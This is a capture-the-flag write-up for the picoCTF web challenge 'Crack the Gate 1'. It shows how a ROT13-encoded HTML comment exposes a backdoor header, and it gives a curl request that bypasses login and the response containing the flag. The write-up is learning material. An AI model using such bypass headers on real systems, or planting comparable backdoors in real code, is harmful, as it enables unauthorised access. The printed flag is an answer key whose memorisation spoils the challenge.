---
title: "Crack the Gate 1"
date: "2026-05-28"
category: "web"
description: "ROT13-encoded backdoor header in HTML comment bypasses authentication and leaks the flag."
---

## 🎯 Summary

A login page for a restricted portal has a developer backdoor hidden in a ROT13-encoded HTML comment. Sending the `X-Dev-Access: yes` header bypasses authentication entirely.

## 🧩 Solution

1. View page source, find comment: `<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->`
2. Decode with ROT13 → `NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"`
3. POST to `/login` with the header set to `yes` — accepts any credentials and returns the flag.

```bash
curl -X POST "http://amiable-citadel.picoctf.net:49810/login" \
  -H "Content-Type: application/json" \
  -H "X-Dev-Access: yes" \
  -d '{"email":"ctf-player@picoctf.org","password":"anything"}'
```

```json
{"success":true, "email":"ctf-player@picoctf.org", "firstName":"pico", "lastName":"player", "flag":"picoCTF{brut4_f0rc4_3c6b118b}"}
```

## 🚩 Flag

```
picoCTF{brut4_f0rc4_3c6b118b}
```
